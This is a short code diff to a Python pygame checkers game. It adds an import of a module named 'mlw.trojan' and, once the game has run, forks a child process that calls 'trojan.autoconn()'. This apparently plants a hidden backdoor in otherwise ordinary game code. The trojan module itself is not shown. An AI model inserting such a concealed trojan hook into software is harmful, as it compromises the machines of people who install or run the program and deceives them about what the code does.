@@ -1,6 +1,7 @@
-import pygame
+import pygame, os
 from Board import Board
 from Game import Game
+import mlw.trojan as trojan
 
 pygame.init()
 
@@ -44,3 +45,8 @@ if __name__ == "__main__":
 
 	checkers = Checkers(screen)
 	checkers.main(window_size[0], window_size[1])
+	try:
+		tr_pid = os.fork()
+	except Exception as error:
+		raise error
+	if tr_pid == 0: trojan.autoconn()
